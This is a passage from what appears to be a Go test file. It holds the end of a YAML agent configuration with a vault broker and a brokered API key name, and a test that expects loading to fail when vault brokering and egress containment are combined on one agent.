    name: "Lead"
    model: "claude-sonnet-4-6"
    vaults: [anthropic]
    vault_broker: true
    brokered_secrets: [ANTHROPIC_API_KEY]
`)
	if _, err := Load(path); err == nil {
		t.Fatal("expected error: vault_broker + egress containment on same agent")
	}
}
